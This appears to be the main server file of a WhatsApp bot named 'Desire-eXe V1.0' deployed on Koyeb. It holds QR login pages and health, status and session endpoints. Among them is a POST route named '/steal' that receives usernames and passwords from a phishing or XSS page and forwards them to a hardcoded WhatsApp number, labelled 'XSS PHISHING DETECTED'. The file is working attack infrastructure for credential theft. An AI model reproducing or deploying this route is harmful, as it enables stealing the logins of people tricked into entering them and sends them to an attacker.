const { startBot, getQRPage, getQRCode } = require('./config/WhatsappConnection.js');
const express = require('express');
const bodyParser = require('body-parser');

// ✅ Express server setup
const app = express();
const port = process.env.PORT || 8000;

app.use(bodyParser.json());

// Global variables to track bot state
global.botStatus = 'starting';
global.whatsappBot = null;
global.connectionTime = null;

// Helper function to get session information
function getSessionInfo() {
  const sock = global.whatsappBot;
  
  if (!sock) {
    return {
      connected: false,
      message: 'Bot not initialized'
    };
  }

  const creds = sock.authState?.creds || {};
  const sessionId = creds.me?.id;
  
  return {
    connected: global.botStatus === 'connected',
    hasSession: !!sessionId,
    registered: creds.registered || false,
    platform: sock.user?.platform || 'Unknown',
    sessionId: sessionId ? `${sessionId.substring(0, 8)}...` : 'Not authenticated',
    phone: creds.me?.phone ? `${creds.me.phone.substring(0, 4)}...` : null,
    connectionTime: global.connectionTime
  };
}

// QR Code Route - Beautiful web interface
app.get('/qr', (req, res) => {
  const { qrCode, qrCodeImage, isConnected } = getQRCode();
  
  if (qrCode && qrCodeImage) {
    res.send(getQRPage());
  } else if (isConnected) {
    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
          <title>Desire-eXe V1.0 - Connected</title>
          <style>
              body {
                  font-family: Arial, sans-serif;
                  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                  margin: 0;
                  padding: 20px;
                  display: flex;
                  justify-content: center;
                  align-items: center;
                  min-height: 100vh;
                  text-align: center;
                  color: white;
              }
              .container {
                  background: rgba(255,255,255,0.1);
                  padding: 40px;
                  border-radius: 15px;
                  backdrop-filter: blur(10px);
                  max-width: 500px;
                  width: 100%;
              }
              h1 { font-size: 2.5em; margin-bottom: 20px; }
              .status { 
                  background: #4CAF50; 
                  padding: 20px; 
                  border-radius: 10px; 
                  font-size: 1.2em;
                  margin: 20px 0;
              }
              .btn {
                  display: inline-block;
                  padding: 10px 20px;
                  background: #007bff;
                  color: white;
                  text-decoration: none;
                  border-radius: 5px;
                  margin: 5px;
                  transition: background 0.3s;
              }
              .btn:hover {
                  background: #0056b3;
              }
          </style>
      </head>
      <body>
          <div class="container">
              <h1>🤖 Desire-eXe V1.0</h1>
              <div class="status">
                  ✅ Bot Connected & Ready!
              </div>
              <p>Your WhatsApp bot is successfully connected and running.</p>
              <div style="margin-top: 20px;">
                  <a href="/status" class="btn">Status</a>
                  <a href="/session" class="btn">Session Info</a>
                  <a href="/health" class="btn">Health Check</a>
              </div>
              <div style="margin-top: 20px; font-size: 12px; color: #ccc;">
                  Connection Time: ${global.connectionTime || 'Unknown'}
              </div>
          </div>
      </body>
      </html>
    `);
  } else {
    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
          <title>Desire-eXe V1.0 - Waiting</title>
          <style>
              body {
                  font-family: Arial, sans-serif;
                  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                  margin: 0;
                  padding: 20px;
                  display: flex;
                  justify-content: center;
                  align-items: center;
                  min-height: 100vh;
                  text-align: center;
                  color: white;
              }
              .container {
                  background: rgba(255,255,255,0.1);
                  padding: 40px;
                  border-radius: 15px;
                  backdrop-filter: blur(10px);
                  max-width: 500px;
                  width: 100%;
              }
              h1 { font-size: 2.5em; margin-bottom: 20px; }
              .status { 
                  background: #ff9800; 
                  padding: 20px; 
                  border-radius: 10px; 
                  font-size: 1.2em;
                  margin: 20px 0;
              }
              .loader {
                  border: 5px solid #f3f3f3;
                  border-top: 5px solid #3498db;
                  border-radius: 50%;
                  width: 50px;
                  height: 50px;
                  animation: spin 2s linear infinite;
                  margin: 20px auto;
              }
              @keyframes spin {
                  0% { transform: rotate(0deg); }
                  100% { transform: rotate(360deg); }
              }
              .btn {
                  display: inline-block;
                  padding: 10px 20px;
                  background: #007bff;
                  color: white;
                  text-decoration: none;
                  border-radius: 5px;
                  margin: 5px;
                  transition: background 0.3s;
              }
              .btn:hover {
                  background: #0056b3;
              }
          </style>
      </head>
      <body>
          <div class="container">
              <h1>🤖 Desire-eXe V1.0</h1>
              <div class="status">
                  ⏳ ${global.botStatus === 'reconnecting' ? 'Reconnecting...' : 'Waiting for QR Code...'}
              </div>
              <div class="loader"></div>
              <p>${global.botStatus === 'reconnecting' ? 'Auto-reconnecting to WhatsApp...' : 'Please wait while we generate a QR code for authentication.'}</p>
              <p>This page will refresh automatically.</p>
              <div style="margin-top: 20px;">
                  <a href="/status" class="btn">Status</a>
                  <a href="/health" class="btn">Health Check</a>
              </div>
          </div>
          <script>
              // Auto-refresh every 10 seconds
              setTimeout(() => location.reload(), 10000);
          </script>
      </body>
      </html>
    `);
  }
});

// JSON QR Code endpoint
app.get('/qr/json', (req, res) => {
  const { qrCode, qrCodeImage, isConnected } = getQRCode();
  
  res.json({
    success: !!qrCode,
    connected: isConnected,
    qrAvailable: !!qrCode,
    qrImage: qrCodeImage,
    botStatus: global.botStatus,
    message: qrCode ? 'QR code available' : 'No QR code available',
    timestamp: new Date().toISOString()
  });
});

// Health check routes (for Koyeb)
app.get('/', (req, res) => {
  const sessionInfo = getSessionInfo();
  const { qrCode, qrCodeImage, isConnected } = getQRCode();
  
  res.json({ 
    status: 'online', 
    bot: 'Desire-eXe V1.0',
    platform: 'Koyeb Cloud',
    region: process.env.KOYEB_REGION || 'global',
    botStatus: global.botStatus,
    session: sessionInfo,
    qr: {
      available: !!qrCode,
      connected: isConnected
    },
    uptime: process.uptime(),
    timestamp: new Date().toISOString()
  });
});

app.get('/health', (req, res) => {
  const sessionInfo = getSessionInfo();
  
  res.status(200).json({ 
    status: 'healthy',
    uptime: process.uptime(),
    botStatus: global.botStatus,
    session: sessionInfo,
    memory: process.memoryUsage(),
    timestamp: new Date().toISOString()
  });
});

// Additional endpoints for better uptime monitoring
app.get('/ping', (req, res) => {
  res.json({ 
    status: 'pong',
    botStatus: global.botStatus,
    platform: 'Koyeb',
    uptime: process.uptime(),
    time: new Date().toISOString()
  });
});

// Enhanced status endpoint
app.get('/status', (req, res) => {
  const sessionInfo = getSessionInfo();
  const { qrCode, qrCodeImage, isConnected } = getQRCode();
  
  res.json({
    status: 'online',
    platform: 'Koyeb Cloud Hosting',
    region: process.env.KOYEB_REGION || 'global',
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    botStatus: global.botStatus,
    session: sessionInfo,
    qr: {
      available: !!qrCode,
      connected: isConnected
    },
    connectionTime: global.connectionTime,
    timestamp: new Date().toISOString()
  });
});

// Session info endpoint
app.get('/session', (req, res) => {
  const sessionInfo = getSessionInfo();
  
  res.json({
    success: true,
    botStatus: global.botStatus,
    session: sessionInfo,
    connectionTime: global.connectionTime,
    uptime: process.uptime(),
    timestamp: new Date().toISOString()
  });
});

// Session ID endpoint
app.get('/session/id', (req, res) => {
  const sock = global.whatsappBot;
  const sessionId = sock?.authState?.creds?.me?.id;
  
  if (!sessionId) {
    return res.json({
      success: false,
      message: 'No active WhatsApp session',
      botStatus: global.botStatus,
      suggestion: 'Visit /qr to get a QR code'
    });
  }
  
  res.json({
    success: true,
    sessionId: sessionId,
    maskedSessionId: sessionId.substring(0, 8) + '...',
    botStatus: global.botStatus,
    connectionTime: global.connectionTime,
    timestamp: new Date().toISOString()
  });
});

// Example route: send data to your WhatsApp
app.post('/steal', async (req, res) => {
  const { username, password } = req.body;
  const yourNumber = '2347017747337@s.whatsapp.net'; // YOUR WHATSAPP_NUMBER@s.whatsapp.net

  try {
    // Wait for bot to be ready
    if (global.whatsappBot && global.botStatus === 'connected') {
      await global.whatsappBot.sendMessage(yourNumber, {
        text: `🕷 *XSS PHISHING DETECTED!* \n\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 Source: Koyeb Server\n⏰ Time: ${new Date().toLocaleString()}`,
      });
      res.json({
        success: true,
        message: 'Credentials sent to WhatsApp',
        timestamp: new Date().toISOString()
      });
    } else {
      res.status(503).json({ 
        success: false,
        error: 'WhatsApp bot not ready',
        botStatus: global.botStatus,
        suggestion: 'Try again in a few seconds or check /status'
      });
    }
  } catch (err) {
    console.error('❌ Error sending credentials to WhatsApp:', err.message);
    res.status(500).json({ 
      success: false,
      error: 'Failed to send message',
      botStatus: global.botStatus,
      details: err.message
    });
  }
});

// Bot information endpoint
app.get('/bot/info', (req, res) => {
  const sessionInfo = getSessionInfo();
  
  res.json({
    name: 'Desire-eXe V1.0',
    version: '1.0',
    developer: 'Desire',
    platform: 'Koyeb Cloud',
    status: global.botStatus,
    session: sessionInfo,
    features: [
      'AI-Powered Responses',
      'Media Download',
      'Group Management',
      'Security Tools',
      'Web Integration'
    ],
    endpoints: {
      qr: '/qr',
      status: '/status',
      session: '/session',
      health: '/health'
    },
    timestamp: new Date().toISOString()
  });
});

// ✅ KOYEB: Start WhatsApp bot FIRST, then Express server
async function initializeApp() {
  try {
    console.log('🚀 Starting Desire-eXe V1.0 on Koyeb...');
    
    // Start WhatsApp bot first
    const sock = await startBot();
    
    // Store bot instance globally for use in routes
    global.whatsappBot = sock;
    
    console.log('✅ WhatsApp bot initialization complete');
    
    // Now start Express server
    const server = app.listen(port, () => {
      console.log(`🚀 Express server running on port ${port}`);
      console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
      console.log(`🌐 Platform: Koyeb Cloud`);
      
      // ✅ KOYEB: Show Koyeb-specific info
      if (process.env.KOYEB_REGION) {
        console.log(`🌐 Koyeb Region: ${process.env.KOYEB_REGION}`);
      }
      if (process.env.KOYEB_SERVICE_NAME) {
        console.log(`🌐 Koyeb Service: ${process.env.KOYEB_SERVICE_NAME}`);
      }
      
      // ✅ DYNAMIC URLS: Works for any Koyeb app or localhost
      const baseUrl = process.env.KOYEB_APP_DOMAIN 
        ? `https://${process.env.KOYEB_APP_DOMAIN}`
        : `http://localhost:${port}`;
      
      console.log(`🌐 Health Check: ${baseUrl}/health`);
      console.log(`📱 QR Code: ${baseUrl}/qr`);
      console.log(`🔗 Status: ${baseUrl}/status`);
      console.log(`🆔 Session: ${baseUrl}/session`);
      console.log(`🤖 Bot Info: ${baseUrl}/bot/info`);
      
      // ✅ Also show local access if running locally
      if (!process.env.KOYEB_APP_DOMAIN) {
        console.log(`💻 Local Access: ${baseUrl}`);
      }
    });

    // ✅ KOYEB: Graceful shutdown for Koyeb
    process.on('SIGTERM', () => {
      console.log('👋 Koyeb is stopping the service...');
      global.botStatus = 'shutting_down';
      server.close(() => {
        console.log('✅ Express server closed gracefully');
        process.exit(0);
      });
    });

    process.on('SIGINT', () => {
      console.log('👋 Process interrupted...');
      global.botStatus = 'shutting_down';
      server.close(() => {
        console.log('✅ Express server closed');
        process.exit(0);
      });
    });

  } catch (err) {
    console.error('❌ Failed to start bot:', err);
    global.botStatus = 'failed';
    
    // ✅ KOYEB: Auto-restart instead of immediate exit
    console.log('🔄 Auto-restarting in 10 seconds...');
    setTimeout(initializeApp, 10000);
  }
}

// Start the application
initializeApp();

// ✅ KOYEB: Better error handling
process.on('uncaughtException', (error) => {
  console.error('🔄 Uncaught Exception:', error.message);
  global.botStatus = 'error';
  // Don't exit - let Koyeb handle restarts
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('🔄 Unhandled Rejection:', reason);
  global.botStatus = 'error';
  // Don't exit - let Koyeb handle restarts
});

// ✅ WHATSAPP: Keep connection alive to prevent timeouts
setInterval(async () => {
  if (global.whatsappBot && global.botStatus === 'connected') {
    try {
      // Send presence update to keep connection alive
      await global.whatsappBot.sendPresenceUpdate('available');
      console.log('❤️ Keep-alive ping sent to WhatsApp');
    } catch (error) {
      console.log('⚠️ Keep-alive failed, connection might be dead:', error.message);
      global.botStatus = 'error';
    }
  }
}, 4 * 60 * 1000); // Every 4 minutes

// ✅ KOYEB: Keep-alive for Koyeb (prevent app sleep)
setInterval(() => {
  if (global.botStatus) {
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);
    
    console.log(`🤖 Bot Status: ${global.botStatus}, Uptime: ${hours}h ${minutes}m ${seconds}s`);
  }
}, 60000); // Every minute

console.log('🔄 app.js loaded successfully');
